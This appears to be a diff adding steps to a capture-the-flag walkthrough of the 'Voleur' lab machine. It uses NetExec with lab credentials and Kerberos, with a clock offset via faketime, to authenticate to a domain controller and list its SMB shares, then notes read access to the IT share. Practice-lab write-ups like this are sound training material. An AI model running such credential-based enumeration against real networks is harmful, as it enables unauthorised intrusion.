@@ -94,3 +94,26 @@ faketime -f +8h nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
 SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
 SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
 ```
+I have successful authentication
+
+```python
+faketime -f +8h nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
+SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
+SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
+SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
+SMB         dc.voleur.htb   445    dc               -----           -----------     ------
+SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
+SMB         dc.voleur.htb   445    dc               C$                              Default share
+SMB         dc.voleur.htb   445    dc               Finance                         
+SMB         dc.voleur.htb   445    dc               HR                              
+SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
+SMB         dc.voleur.htb   445    dc               IT              READ            
+SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
+SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
+```
+Read perms on `IT`
+
+```python
+
+```
